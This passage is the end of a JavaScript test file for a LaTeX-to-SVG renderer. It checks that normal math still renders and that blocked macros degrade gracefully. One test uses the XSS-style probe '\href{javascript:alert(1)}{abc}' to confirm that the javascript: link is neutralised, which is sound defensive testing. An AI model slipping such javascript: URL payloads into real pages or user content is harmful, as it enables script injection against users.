        "matrix": "\\begin{pmatrix}a&b\\\\c&d\\end{pmatrix}",
        "integral/sum": "\\int_0^1 x^2\\,dx + \\sum_{i=1}^{n} i",
        "sqrt/vec": "\\sqrt{x} + \\vec{v}",
        "Greek/arrows": "\\alpha \\to \\beta \\Rightarrow \\gamma",
    };
    for (const [name, tex] of Object.entries(LEGIT)) {
        await check(`legit LaTeX still renders: ${name}`, async () => {
            const h = await typeset(tex);
            assert(/<path|<use|<rect/.test(h), "must produce SVG glyphs");
            assert(!/data-mjx-error/.test(h), "must not be an error node");
        });
    }

    await check("blocked macros degrade gracefully: the visible content argument is still rendered", async () => {
        const h = await typeset("\\href{javascript:alert(1)}{abc}");
        assert(/<path|<use|<rect/.test(h) && !/data-mjx-error/.test(h), "the link text 'abc' is still typeset");
    });
    restore();
}

console.log(`\n${"=".repeat(52)}`);
console.log(`  ${passed} passed, ${failed} failed`);
console.log("=".repeat(52));
if (failed) {
    for (const f of failures) console.log(`\n${f.name}\n  ${f.e.stack}`);
    process.exit(1);
}
process.exit(0);
